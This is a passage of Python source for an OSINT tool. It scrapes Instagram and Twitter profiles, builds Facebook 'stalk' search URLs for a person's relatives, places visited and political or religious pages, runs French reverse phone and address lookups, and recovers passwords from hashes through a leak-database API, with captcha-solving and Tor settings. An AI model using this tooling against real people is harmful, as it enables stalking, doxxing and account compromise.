        print(f"  {Wh}Duration    : {Y}{total:.1f}s")
        print(f"  {Wh}Findings    : {C}{len(self.profile.findings)} data points")

        # Show most critical findings
        critical = [f for f in self.profile.findings if f.confidence == "CRITICAL"]
        high = [f for f in self.profile.findings if f.confidence == "HIGH"]
        if critical:
            print(f"  {R}   {len(critical)} critical findings{Wh}")
            for c in critical[:3]:
                print(f"      {R}! {c.category}: {str(c.value)[:60]}")
        if high:
            print(f"  {Gr}   {len(high)} high-confidence findings{Wh}")

        print(f"\n  {Wh}Phase times:")
        for ph, dur in self.phase_times.items():
            print(f"      {ph}: {dur:.1f}s")

        print(f"\n  {Gr}[] Full report saved to reports/{Wh}")
        print(f"  {Y}[*] Next steps: Use AI Correlation (22) or Visualization (23) for deeper analysis{Wh}")
        print(f"  {Wh}{'='*55}\n")


def deepdive_menu():
    """DeepDive Investigation — Unified Intelligence Workflow"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} DEEPDIVE — UNIFIED INTELLIGENCE WORKFLOW")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] 6-Phase automated investigation{Wh}")
    print(f"{Y}    1. Passive Recon    2. Surface Web    3. Technical{Wh}")
    print(f"{Y}    4. Deep/Dark Web    5. Correlation     6. Reporting{Wh}")
    print(f"{Wh}")
    print(f"{Wh}  Supports: {C}email, username, phone, domain, IP, name{Wh}")

    target = input(f"\n{Wh}[+] Enter target: {Gr}").strip()
    if not target:
        return

    try:
        target = sanitize_target(target)
    except ValueError as e:
        print(f"{R}[!] {e}{Wh}")
        input(f"\n[+] Press Enter")
        return

    ttype = detect_target_type(target)
    print(f"\n{Wh}  Detected type: {Gr}{ttype}{Wh}")
    confirm = input(f"\n{Wh}[?] Start DeepDive investigation? {Gr}(y/n){Wh}: {Gr}").strip().lower()
    if confirm != 'y':
        print(f"{Y}[!] Cancelled{Wh}")
        input(f"\n[+] Press Enter")
        return

    orchestrator = InvestigationOrchestrator(target)
    try:
        orchestrator.run()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Investigation interrupted{Wh}")
    except Exception as e:
        print(f"\n{R}[!] DeepDive error: {e}{Wh}")
        import traceback
        traceback.print_exc()

    input(f"\n{Wh}[+] Press Enter")


# 
# LITTLEBROTHER INTEGRATIONS — Imported Features
# 

class SMSReceiver:
    """Free SMS Reception via temporary numbers (ported from LittleBrother)"""
    
    def search_servers(self) -> List[Dict]:
        servers = []
        try:
            url = "https://www.receive-sms-online.info/"
            resp = requests.get(url, timeout=10)
            page = resp.content.decode('utf-8')
            matches = re.findall(r"<a href=\"([0-9]+)-([a-zA-Z0-9_]+)", page)
            for i, (num, country) in enumerate(matches, 1):
                servers.append({"id": i, "number": num, "country": country})
            self._base_url = url
        except: pass
        return servers
    
    def fetch_messages(self, number_path: str) -> Dict:
        result = {"from_users": [], "messages": [], "times": [], "count": 0, "latest_message": "", "latest_from": ""}
        try:
            url = f"https://www.receive-sms-online.info/{number_path}"
            resp = requests.get(url, timeout=10)
            page = resp.content.decode('utf-8')
            from_users = re.findall(r'data-label="From   :">([a-zA-Z0-9_ +]+)</td>', page)
            messages = re.findall(r'data-label="Message:">(.*)</td>', page)
            times = re.findall(r'data-label="Added:">(.*)</td>', page)
            result["from_users"] = from_users
            result["messages"] = messages
            result["times"] = times
            result["count"] = len(from_users)
            if len(messages) > 1:
                result["latest_message"] = messages[1]
                result["latest_from"] = from_users[1] if len(from_users) > 1 else ""
        except: pass
        return result
    
    def listen_live(self, number_path: str, poll_interval: int = 3):
        """Live-listen for new SMS messages"""
        initial = self.fetch_messages(number_path)
        last_msg = initial["latest_message"]
        print(f"{Y}[*] Listening for SMS on {number_path}...{Wh}")
        print(f"{Wh}    Last: {last_msg}")
        print(f"{Y}    Press Ctrl+C to stop{Wh}")
        try:
            while True:
                time.sleep(poll_interval)
                current = self.fetch_messages(number_path)
                new_msg = current["latest_message"]
                if new_msg and new_msg != last_msg:
                    print(f"\n{Gr}[+] NEW SMS!{Wh}")
                    print(f"    {Wh}From: {C}{current['latest_from']}")
                    print(f"    {Wh}Msg:  {Gr}{new_msg}")
                    last_msg = new_msg
        except KeyboardInterrupt:
            print(f"\n{Y}[-] Stopped listening{Wh}")


class HashDecryptor:
    """Hash decryption via lea.kz API (ported from LittleBrother)"""
    
    def decrypt(self, hash_value: str) -> Optional[str]:
        try:
            resp = requests.get(f"https://lea.kz/api/hash/{hash_value}", timeout=10)
            data = resp.json()
            return data.get("password")
        except: return None
    
    def check_email_leak(self, email: str) -> Optional[str]:
        try:
            resp = requests.get(f"https://lea.kz/api/email/{email}", timeout=10)
            data = resp.json()
            return data.get("leaked")
        except: return None


class InstagramScraper:
    """Instagram profile data extraction from embedded JSON (ported from LittleBrother)"""
    
    def get_profile(self, username: str) -> Dict:
        result = {"username": username, "found": False}
        try:
            if username.startswith("http"):
                url = username
            else:
                url = f"https://instagram.com/{username}"
            page = requests.get(url, timeout=10, headers={"User-Agent": random.choice(CONFIG["user_agents"])})
            html = page.content.decode('utf-8')
            scripts = re.findall(r"<script type=\"text/javascript\">(.*?);</script>", html, re.DOTALL)
            json_raw = None
            for s in scripts:
                if "window._sharedData" in s:
                    json_raw = s.replace("window._sharedData = ", "").strip()
                    break
            if not json_raw:
                return result
            values = json.loads(json_raw)
            user = values['entry_data']['ProfilePage'][0]['graphql']['user']
            result.update({
                "found": True,
                "id": user['id'],
                "username": user['username'],
                "full_name": user['full_name'],
                "biography": user['biography'],
                "private": user['is_private'],
                "verified": user['is_verified'],
                "followers": user['edge_followed_by']['count'],
                "following": user['edge_follow']['count'],
                "posts": user['edge_owner_to_timeline_media']['count'],
                "profile_pic_hd": user['profile_pic_url_hd'],
                "external_url": user.get('external_url', ''),
                "business": user.get('is_business_account', False),
            })
        except: pass
        return result


class TwitterScraper:
    """Twitter profile data extraction from embedded JSON (ported from LittleBrother)"""
    
    def search_users(self, query: str) -> List[Dict]:
        results = []
        try:
            q = query.replace(" ", "%20")
            resp = requests.get(f"https://twitter.com/search?f=users&vertical=default&q={q}", 
                              headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=10)
            datas = re.findall(r'data-screen-name="(.*?)" data-name="(.*?)"', resp.text)
            for screen_name, name in datas[:20]:
                results.append({"screen_name": screen_name, "name": name})
        except: pass
        return results
    
    def get_profile(self, username: str) -> Dict:
        result = {"username": username, "found": False}
        try:
            if username.startswith("http"):
                url = username
            else:
                url = f"https://twitter.com/{username}"
            resp = requests.get(url, headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=10)
            html = resp.content.decode('utf-8')
            page0 = resp.text
            json_match = re.findall(r'<input type="hidden" id="init-data" class="json-data" value="(.*?)">', html)
            if not json_match:
                return result
            data = json_match[0].replace("&quot;", "\"")
            values = json.loads(data)['profile_user']
            birth = re.findall(r'birthdateText.*?>(.*?)<', page0)
            result.update({
                "found": True,
                "id": values.get('id_str', ''),
                "name": values.get('name', ''),
                "screen_name": values.get('screen_name', ''),
                "location": values.get('location', ''),
                "url": values.get('url', ''),
                "description": values.get('description', ''),
                "protected": values.get('protected', False),
                "verified": values.get('verified', False),
                "followers": values.get('followers_count', 0),
                "friends": values.get('friends_count', 0),
                "statuses": values.get('statuses_count', 0),
                "created_at": values.get('created_at', ''),
                "lang": values.get('lang', ''),
                "birth": birth[0].strip() if birth else "N/A",
            })
        except: pass
        return result


FACEBOOK_STALK_TYPES = {
    "1":  "Photos tagged",           "2":  "Videos tagged",
    "3":  "Stories tagged",          "4":  "Relatives",
    "5":  "Friends",                 "6":  "Friends in common",
    "7":  "Employees",               "8":  "School students",
    "9":  "Local residents",         "10": "All places visited",
    "11": "Bars visited",            "12": "Restaurants visited",
    "13": "Stores visited",          "14": "Outdoor places",
    "15": "Hotels visited",          "16": "Theatres visited",
    "17": "Photos liked",            "18": "Videos liked",
    "19": "Stories liked",           "20": "Photos commented",
    "21": "Photos by user",          "22": "Videos by user",
    "23": "Stories by user",         "24": "Groups joined",
    "25": "Future events",           "26": "Past events",
    "27": "Games used",              "28": "Apps used",
    "29": "Pages liked",             "30": "Political pages",
    "31": "Religious pages",         "32": "Music pages",
    "33": "Movie pages",             "34": "Book pages",
    "35": "Places liked",
}

FACEBOOK_GRAPH_URLS = {
    "1": "https://www.facebook.com/search/{}/photos-of/intersect",
    "2": "https://www.facebook.com/search/{}/videos-of/intersect",
    "3": "https://www.facebook.com/search/{}/stories-tagged/intersect",
    "4": "https://www.facebook.com/search/{}/relatives/intersect",
    "5": "https://www.facebook.com/search/{}/friends/intersect",
    "6": "https://www.facebook.com/search/{}/friends/friends/intersect",
    "7": "https://www.facebook.com/search/{}/employees/intersect/",
    "8": "https://www.facebook.com/search/{}/schools-attended/ever-past/intersect/students/intersect/",
    "9": "https://www.facebook.com/search/{}/current-cities/residents-near/present/intersect",
    "10": "https://www.facebook.com/search/{}/places-visited/",
    "11": "https://www.facebook.com/search/{}/places-visited/110290705711626/places/intersect/",
    "12": "https://www.facebook.com/search/{}/places-visited/273819889375819/places/intersect/",
    "13": "https://www.facebook.com/search/{}/places-visited/200600219953504/places/intersect/",
    "14": "https://www.facebook.com/search/{}/places-visited/935165616516865/places/intersect/",
    "15": "https://www.facebook.com/search/{}/places-visited/164243073639257/places/intersect/",
    "16": "https://www.facebook.com/search/{}/places-visited/192511100766680/places/intersect/",
    "17": "https://www.facebook.com/search/{}/photos-liked/intersect",
    "18": "https://www.facebook.com/search/{}/videos-liked/intersect",
    "19": "https://www.facebook.com/search/{}/stories-liked/intersect",
    "20": "https://www.facebook.com/search/{}/photos-commented/intersect",
    "21": "https://www.facebook.com/search/{}/photos-by/",
    "22": "https://www.facebook.com/search/{}/videos-by/",
    "23": "https://www.facebook.com/search/{}/stories-by/",
    "24": "https://www.facebook.com/search/{}/groups",
    "25": "https://www.facebook.com/search/{}/events-joined/",
    "26": "https://www.facebook.com/search/{}/events-joined/in-past/date/events/intersect/",
    "27": "https://www.facebook.com/search/{}/apps-used/game/apps/intersect",
    "28": "https://www.facebook.com/search/{}/apps-used/",
    "29": "https://www.facebook.com/search/{}/pages-liked/intersect",
    "30": "https://www.facebook.com/search/{}/pages-liked/161431733929266/pages/intersect/",
    "31": "https://www.facebook.com/search/{}/pages-liked/religion/pages/intersect/",
    "32": "https://www.facebook.com/search/{}/pages-liked/musician/pages/intersect/",
    "33": "https://www.facebook.com/search/{}/pages-liked/movie/pages/intersect/",
    "34": "https://www.facebook.com/search/{}/pages-liked/book/pages/intersect/",
    "35": "https://www.facebook.com/search/{}/places-liked/",
}


def receive_sms_menu():
    """Free SMS Reception — Receive SMS on temporary numbers"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} FREE SMS RECEPTION")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Receive SMS on temporary virtual numbers{Wh}")
    
    receiver = SMSReceiver()
    servers = receiver.search_servers()
    if not servers:
        print(f"{R}[!] Could not fetch server list{Wh}")
        input(f"\n[+] Press Enter")
        return
    
    print(f"\n{Gr}[+] Available numbers ({len(servers)}):{Wh}")
    for s in servers[:15]:
        print(f"    {Wh}[{C}{s['id']:2}{Wh}] {Gr}+{s['number']} {Wh}({s['country']})")
    
    choice = input(f"\n{Wh}[+] Select number [1-{len(servers)}]: {Gr}").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(servers):
        return
    selected = servers[int(choice) - 1]
    number_path = f"{selected['number']}-{selected['country']}"
    
    messages = receiver.fetch_messages(number_path)
    print(f"\n{Gr}[+] Messages found: {messages['count']}{Wh}")
    for i, (fr, msg, t) in enumerate(zip(messages['from_users'], messages['messages'], messages['times'])):
        if fr:
            print(f"\n    {Wh}[{i}] From: {C}{fr}")
            print(f"    {Wh}Msg:  {Gr}{msg}")
            print(f"    {Wh}Time: {Y}{t}")
    
    if input(f"\n{Wh}[?] Listen live for new messages? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
        receiver.listen_live(number_path)
    
    input(f"\n[+] Press Enter")


def hash_decrypt_menu():
    """Hash Decryption — Decrypt hashes via lea.kz leak database"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} HASH DECRYPTION (lea.kz)")
    print(f" {Wh}{'='*55}")
    print(f"{Wh}[1] Decrypt hash")
    print(f"{Wh}[2] Check email leak")
    
    mode = input(f"\n{Wh}[+] Mode [1/2]: {Gr}").strip()
    decryptor = HashDecryptor()
    
    if mode == "1":
        h = input(f"{Wh}[+] Enter hash (MD5/SHA1/SHA256): {Gr}").strip()
        if not h: return
        print(f"{Y}[*] Decrypting {h}...{Wh}")
        pwd = decryptor.decrypt(h)
        if pwd:
            print(f"{Gr}[+] Password: {C}{pwd}{Wh}")
        else:
            print(f"{Y}[-] No match found in leak database{Wh}")
    elif mode == "2":
        email = input(f"{Wh}[+] Enter email: {Gr}").strip()
        if not email: return
        print(f"{Y}[*] Checking {email}...{Wh}")
        leak = decryptor.check_email_leak(email)
        if leak:
            print(f"{R}[!] Leaked! Source: {C}{leak}{Wh}")
        else:
            print(f"{Gr}[+] No leak found{Wh}")
    
    input(f"\n[+] Press Enter")


def instagram_osint_menu():
    """Instagram Profile OSINT — Extracts data from embedded JSON"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} INSTAGRAM OSINT (JSON PARSING)")
    print(f" {Wh}{'='*55}")
    
    username = input(f"{Wh}[+] Instagram username: {Gr}").strip()
    if not username: return
    
    print(f"{Y}[*] Fetching profile data...{Wh}")
    scraper = InstagramScraper()
    profile = scraper.get_profile(username)
    
    if not profile.get("found"):
        print(f"{R}[!] Profile not found or private{Wh}")
        input(f"\n[+] Press Enter")
        return
    
    print(f"\n{Gr}[+] Profile found!{Wh}")
    print(f"    {Wh}Username    : {C}{profile['username']}")
    print(f"    {Wh}Full Name   : {Gr}{profile['full_name']}")
    print(f"    {Wh}ID          : {Y}{profile['id']}")
    print(f"    {Wh}Private     : {Gr}{profile['private']}")
    print(f"    {Wh}Verified    : {Gr}{profile['verified']}")
    print(f"    {Wh}Business    : {Gr}{profile['business']}")
    print(f"    {Wh}Followers   : {C}{profile['followers']:,}")
    print(f"    {Wh}Following   : {C}{profile['following']:,}")
    print(f"    {Wh}Posts       : {C}{profile['posts']:,}")
    if profile.get('biography'):
        print(f"    {Wh}Bio         : {Y}{profile['biography'][:150]}")
    if profile.get('external_url'):
        print(f"    {Wh}Website     : {C}{profile['external_url']}")
    if profile.get('profile_pic_hd'):
        print(f"    {Wh}Profile Pic : {C}{profile['profile_pic_hd']}")
    
    # Save report
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="instagram",
        target=username,
        data=profile
    )
    save_report(result)
    
    # Integration: pass to DeepDive
    if input(f"\n{Wh}[?] Run DeepDive on this username? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
        try:
            orchestrator = InvestigationOrchestrator(username)
            orchestrator.run()
        except Exception as e:
            print(f"{Y}[!] DeepDive: {str(e)[:40]}{Wh}")
    
    input(f"\n[+] Press Enter")


def twitter_osint_menu():
    """Twitter Profile OSINT — Extracts data from embedded JSON"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} TWITTER OSINT (JSON PARSING)")
    print(f" {Wh}{'='*55}")
    
    username = input(f"{Wh}[+] Twitter username (without @): {Gr}").strip()
    if not username: return
    
    print(f"{Y}[*] Fetching profile data...{Wh}")
    scraper = TwitterScraper()
    profile = scraper.get_profile(username)
    
    if not profile.get("found"):
        print(f"{R}[!] Profile not found{Wh}")
        # Try search
        print(f"{Y}[*] Searching for '{username}'...{Wh}")
        users = scraper.search_users(username)
        if users:
            print(f"{Gr}[+] Found users:{Wh}")
            for u in users[:10]:
                print(f"    {Wh}- @{C}{u['screen_name']:<20}{Wh} ({u['name']})")
        input(f"\n[+] Press Enter")
        return
    
    print(f"\n{Gr}[+] Profile found!{Wh}")
    print(f"    {Wh}Username    : @{C}{profile['screen_name']}")
    print(f"    {Wh}Name        : {Gr}{profile['name']}")
    print(f"    {Wh}ID          : {Y}{profile['id']}")
    print(f"    {Wh}Verified    : {Gr}{profile['verified']}")
    print(f"    {Wh}Protected   : {Gr}{profile['protected']}")
    print(f"    {Wh}Followers   : {C}{profile['followers']:,}")
    print(f"    {Wh}Following   : {C}{profile['friends']:,}")
    print(f"    {Wh}Tweets      : {C}{profile['statuses']:,}")
    print(f"    {Wh}Location    : {Y}{profile['location']}")
    print(f"    {Wh}Birth       : {Y}{profile['birth']}")
    print(f"    {Wh}Language    : {Gr}{profile['lang']}")
    print(f"    {Wh}Created     : {Y}{profile['created_at']}")
    if profile.get('description'):
        print(f"    {Wh}Bio         : {Y}{profile['description'][:150]}")
    if profile.get('url'):
        print(f"    {Wh}URL         : {C}{profile['url']}")
    
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="twitter",
        target=username,
        data=profile
    )
    save_report(result)
    
    if input(f"\n{Wh}[?] Run DeepDive on this username? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
        try:
            orchestrator = InvestigationOrchestrator(username)
            orchestrator.run()
        except Exception as e:
            print(f"{Y}[!] DeepDive: {str(e)[:40]}{Wh}")
    
    input(f"\n[+] Press Enter")


def facebook_stalk_menu():
    """Facebook Advanced GraphSearch — 35 search types (ported from LittleBrother)"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} FACEBOOK GRAPHSEARCH (35 TYPES)")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Requires Facebook profile ID or username{Wh}")
    
    profile_id = input(f"{Wh}[+] Facebook profile ID/username: {Gr}").strip()
    if not profile_id: return
    
    print(f"\n{Wh}Search types:{Wh}")
    for k, v in FACEBOOK_STALK_TYPES.items():
        print(f"    {R}[{Gr}{k:2}{R}]{Wh} {v}")
    
    choice = input(f"\n{Wh}[+] Type [1-35, or 'all']: {Gr}").strip().lower()
    if choice == "all":
        selected = list(FACEBOOK_GRAPH_URLS.keys())
    elif choice in FACEBOOK_GRAPH_URLS:
        selected = [choice]
    else:
        print(f"{R}[!] Invalid choice{Wh}")
        input(f"\n[+] Press Enter")
        return
    
    print(f"\n{Gr}[+] Opening in browser...{Wh}")
    for sel in selected[:5]:
        url = FACEBOOK_GRAPH_URLS[sel].format(profile_id)
        print(f"    {C}{FACEBOOK_STALK_TYPES[sel]}: {url}{RS}")
        try:
            import webbrowser
            webbrowser.open(url)
        except: pass
    
    print(f"\n{Y}[*] Links printed above — open in browser manually if needed{Wh}")
    input(f"\n[+] Press Enter")


def pages_jaunes_search():
    """French Directory Search — Pages Jaunes / Pages Blanches (ported from LittleBrother)"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} FRENCH DIRECTORY (PAGES JAUNES)")
    print(f" {Wh}{'='*55}")
    
    print(f"{Wh}[1] Search by name (Pages Blanches)")
    print(f"{Wh}[2] Reverse phone lookup")
    print(f"{Wh}[3] Search by address")
    
    mode = input(f"\n{Wh}[+] Mode [1/2/3]: {Gr}").strip()
    
    headers = {
        'User-Agent': random.choice(CONFIG["user_agents"]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    
    if mode == "1":
        name = input(f"{Wh}[+] Firstname Lastname: {Gr}").strip()
        city = input(f"{Wh}[+] City/Department: {Gr}").strip()
        if not name: return
        print(f"{Y}[*] Searching French directory for {name} in {city}...{Wh}")
        try:
            url = f"https://www.pagesjaunes.fr/pagesblanches/recherche?quoiqui={name}&ou={city}"
            resp = requests.get(url, headers=headers, timeout=15)
            if resp.status_code == 200 and BeautifulSoup:
                soup = BeautifulSoup(resp.text, "html.parser")
                names = soup.find_all("a", {"class": "denomination-links pj-lb pj-link"})
                addresses = soup.find_all("a", {"class": "adresse pj-lb pj-link"})
                phones = soup.find_all("strong", {"class": "num"})
                if names:
                    print(f"\n{Gr}[+] Results:{Wh}")
                    for i, (n, a, p) in enumerate(zip(names[:10], addresses[:10], phones[:10]), 1):
                        print(f"\n    {Wh}[{i}] {C}{n.text.strip()}")
                        print(f"    {Wh}    Addr: {Y}{a.text.strip()}")
                        print(f"    {Wh}    Tel:  {Gr}{p.text.strip()}")
                else:
                    print(f"{Y}[-] No results found{Wh}")
        except Exception as e:
            print(f"{R}[!] Error: {str(e)[:50]}{Wh}")
    
    elif mode == "2":
        phone = input(f"{Wh}[+] French phone number: {Gr}").strip()
        if not phone: return
        print(f"{Y}[*] Reverse lookup for {phone}...{Wh}")
        try:
            url = f"https://www.pagesjaunes.fr/annuaireinverse/recherche?quoiqui={phone}"
            resp = requests.get(url, headers=headers, timeout=15)
            if resp.status_code == 200 and BeautifulSoup:
                soup = BeautifulSoup(resp.text, "html.parser")
                names = soup.find_all("a", {"class": "denomination-links pj-lb pj-link"})
                addresses = soup.find_all("a", {"class": "adresse pj-lb pj-link"})
                if names:
                    print(f"\n{Gr}[+] Found:{Wh}")
                    for n, a in zip(names[:5], addresses[:5]):
                        print(f"    {Wh}- {C}{n.text.strip()} {Wh}| {Y}{a.text.strip()}")
                else:
                    print(f"{Y}[-] No result{Wh}")
        except Exception as e:
            print(f"{R}[!] Error: {str(e)[:50]}{Wh}")
    
    elif mode == "3":
        addr = input(f"{Wh}[+] Address: {Gr}").strip()
        if not addr: return
        try:
            url = f"https://www.pagesjaunes.fr/pagesblanches/recherche?quoiqui=&ou={addr}"
            resp = requests.get(url, headers=headers, timeout=15)
            if resp.status_code == 200 and BeautifulSoup:
                soup = BeautifulSoup(resp.text, "html.parser")
                names = soup.find_all("a", {"class": "denomination-links pj-lb pj-link"})
                addresses = soup.find_all("a", {"class": "adresse pj-lb pj-link"})
                if names:
                    print(f"\n{Gr}[+] Residents:{Wh}")
                    for n, a in zip(names[:10], addresses[:10]):
                        print(f"    {Wh}- {C}{n.text.strip()} {Wh}| {Y}{a.text.strip()}")
        except Exception as e:
            print(f"{R}[!] Error: {str(e)[:50]}{Wh}")
    
    input(f"\n[+] Press Enter")


def email_header_analyze():
    """Email Header Analysis — Extract IP and ISP from email headers (ported from LittleBrother)"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} EMAIL HEADER ANALYSIS")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Paste the full email headers (Received lines, From, etc.){Wh}")
    print(f"{Y}    Type/paste headers, then Ctrl+Z + Enter to finish:{Wh}")
    
    lines = []
    try:
        while True:
            line = input()
            lines.append(line)
    except EOFError:
        pass
    
    header_text = "\n".join(lines)
    
    print(f"\n{Y}[*] Analyzing email headers...{Wh}")
    
    # Extract sender
    from_match = re.search(r"From:\s*(.+)", header_text)
    if from_match:
        sender = from_match.group(1).strip()
        print(f"{Wh}  From          : {C}{sender}")
    
    # Extract IPs from Received headers
    ips_found = set()
    for line in header_text.split('\n'):
        if 'Received:' in line or 'received:' in line:
            found_ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line)
            for ip in found_ips:
                if not ip.startswith("10.") and not ip.startswith("192.168.") and not ip.startswith("172.16."):
                    ips_found.add(ip)
    
    if ips_found:
        print(f"\n{Gr}[+] Found {len(ips_found)} public IP(s):{Wh}")
        for ip in ips_found:
            try:
                host = socket.gethostbyaddr(ip)
                hostname = host[0]
            except:
                hostname = "N/A"
            try:
                resp = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,org,country,city", timeout=5)
                geo = resp.json()
                isp = geo.get('isp', 'N/A')
                loc = f"{geo.get('city', '?')}, {geo.get('country', '?')}"
            except:
                isp, loc = "N/A", "N/A"
            print(f"\n    {Wh}IP      : {C}{ip}")
            print(f"    {Wh}Hostname: {Y}{hostname}")
            print(f"    {Wh}ISP     : {Gr}{isp}")
            print(f"    {Wh}Location: {Y}{loc}")
    else:
        print(f"{Y}[-] No public IPs found in headers{Wh}")
    
    # Save
    data = {"headers_snippet": header_text[:500], "ips": list(ips_found)}
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="email_header",
        target="email_headers",
        data=data
    )
    save_report(result)
    input(f"\n[+] Press Enter")


# ═══════════════════════════════════════════════
# CONFIGURATION MENU — Set API Keys at Runtime
# ═══════════════════════════════════════════════

def settings_menu():
    print(f"\n {Wh}{'='*55}")
    print(f" {R}CONFIGURATION SETTINGS")
    print(f" {Wh}{'='*55}")
    
    while True:
        print(f"\n{Wh}─── Current Configuration ───")
        print(f"  {Wh}1) DeHashed Email : {Gr}{DEHASHED_CONFIG['email'] or 'NOT SET'}")
        print(f"  {Wh}2) DeHashed API   : {Gr}{'****' if DEHASHED_CONFIG['api_key'] else 'NOT SET'}")
        print(f"  {Wh}3) Groq API Key   : {Gr}{'****' if os.environ.get('GROQ_API_KEY') else 'NOT SET'}")
        print(f"  {Wh}4) Captcha API Key: {Gr}{'****' if CAPTCHA_CONFIG['api_key'] else 'NOT SET'}")
        print(f"  {Wh}5) Captcha Service: {Gr}{CAPTCHA_CONFIG['service']}")
        print(f"  {Wh}6) Tor Proxy      : {Gr}{'ENABLED' if CONFIG['use_tor'] else 'DISABLED'}")
        print(f"  {Wh}7) Max Threads    : {Gr}{CONFIG['max_threads']}")
        print(f"  {Wh}8) Request Timeout: {Gr}{CONFIG['request_timeout']}s")
        print(f"  {Wh}9) Output Dir     : {Gr}{CONFIG['output_dir']}")
        print(f"  {Wh}0) Back to Main Menu")
        
        choice = input(f"\n{Wh}[+] Select [0-9]: {Gr}").strip()
        
        if choice == "1":
            val = input(f"{Wh}[+] DeHashed email: {Gr}").strip()
            if val:
                DEHASHED_CONFIG["email"] = val
                print(f"{Gr}[+] Updated{Wh}")
        elif choice == "2":
            val = input(f"{Wh}[+] DeHashed API key: {Gr}").strip()
            if val:
                DEHASHED_CONFIG["api_key"] = val
                print(f"{Gr}[+] Updated{Wh}")
        elif choice == "3":
            val = input(f"{Wh}[+] Groq API key: {Gr}").strip()
            if val:
                os.environ["GROQ_API_KEY"] = val
                print(f"{Gr}[+] Updated{Wh}")
        elif choice == "4":
            val = input(f"{Wh}[+] Captcha API key (2captcha/capsolver): {Gr}").strip()
            if val:
                CAPTCHA_CONFIG["api_key"] = val
                print(f"{Gr}[+] Updated{Wh}")
        elif choice == "5":
            val = input(f"{Wh}[+] Captcha service [2captcha/capsolver]: {Gr}").strip().lower()
            if val in ("2captcha", "capsolver"):
                CAPTCHA_CONFIG["service"] = val
                print(f"{Gr}[+] Updated{Wh}")
        elif choice == "6":
            CONFIG["use_tor"] = not CONFIG["use_tor"]
            print(f"{Gr}[+] Tor {'ENABLED' if CONFIG['use_tor'] else 'DISABLED'}{Wh}")
        elif choice == "7":
            val = input(f"{Wh}[+] Max threads [1-50]: {Gr}").strip()
            if val.isdigit():
                CONFIG["max_threads"] = max(1, min(50, int(val)))
                print(f"{Gr}[+] Updated{Wh}")
        elif choice == "8":
            val = input(f"{Wh}[+] Request timeout seconds [5-60]: {Gr}").strip()
            if val.isdigit():
                CONFIG["request_timeout"] = max(5, min(60, int(val)))
                print(f"{Gr}[+] Updated{Wh}")
        elif choice == "9":
            val = input(f"{Wh}[+] Output directory: {Gr}").strip()
            if val:
                CONFIG["output_dir"] = val
                print(f"{Gr}[+] Updated{Wh}")
        elif choice == "0":
            break


BANNER_0XK = R"""                  .·´¯¯¯¯¯¯`·.
                :'                 ':
               :             . ·´¯¯¯¯`·.
 .·´¯¯`·.,.:´      .  ·  ´              /
 \            . ·´¯     ¯¯¯¯ ¯¯  `  · .
   `·.__.·´¯|/                  .·´¯`·.    |                       ^
              |/    .´¯`·.      /       /     |                    ¸ ‹^ ›  '
               |   /       \   /              |                       ( ;)
         :´¯`· . \   ..-–=\|/  ()   /     / .·´¯`:             ; ' )(  .
         :,  \      :´¯¯`·      ·´¯¯`:         /  ,:                )(
      :´''            :                 :               '''`:           / ;  ' \
     ;   ¸¸¸¸¸....––'·.,         , .·'··––....¸¸¸.,;:::;:::::::::\·´¯`/
       :,  ¯¯   ¯         ¯¯¯¯            ¯ ¯¯¯  ,:          ¯
        :.                                              .:
          ` · .,, __,,, ..  ·´` ·  .. , ,, __ ,, . ·´
                          POPEYE ™
                                            ßÿ, 0xk
"""

BANNER_DUMMAZZ = R"""
"""

BANNER_NESS = R"""

                             , . . . . . . . . . , ,
         ,'  ' ·,      , · '    ·,                    ' · ,        ,' ' ·,
     , · ·.   .'  , '          ,·',·,                       ' ·, ,·'    ·'· ·,
     ' · . .,   '·;           '  ,'·, '                          ;  ,·' ' ' ' '
              ' ,;             '    '·                           ;'
                 ',                                             ,'
                ,' '      . , , ,             , , , .          ' ;
                 ',      , , , ,  '·,     ,·'  , , , ,           ;
                 ,'     ',::::::::',  ;   ;  ,':::::::,'         ,'
              , · ',      ' ' ' ' ' ' ,;¸¸¸;, ' ' ' ' ' '         ,' ·,
     , , , ·'   ,  '' ,              '****'                  ,'' ,   '  , , ,
    '·,..    , '        ' ,'   `;`;`;`;`; ;´;´;´;´;´    ,' '      ' ,   ,..·'
        '·, .'            ',    ','' '' '' '' '' '' '' '','   ,'         '. , ·'
              Ñë§§     ',    ' ;'';'';'';'';'';'';'   ,'   **
                             ' ,      ,              ,'        **
                                ' · · · ·''· · · · '
"""

BANNER_POPEYE = R"""

                 , · " ˜ `-,' ` - , , - ~, ,  ,  ,
            , · "-                 ' .       ' " ,   " ,'  ,
            ",                                         '     " ,
            ,''-                                                 ',
            ' ,                                                  ',
              ",        ',    ,                                   "
                ¯ '' · -,'\    ' ‚  ' ‚  ,  ',                    ,'
                     / '   ` ```` ' '    ' ~'\                   '\
                   ,'                         '\                   ,'
                  /                            '¹,               ,/
                 '                                '¦              /'
                 !                   , ~         /'             ',
              ""\|             ,~ "             ,'              ,'
                  '',~,   ,~*'                 /                |
                (˜‚„-,    , ‚„' '¯')            '\ ,/ ' ¯ )     /
                 (` ','   ' '  ' ´                    ' ', /     ,'
                , ·'    . .                       ~ ´\     ,/
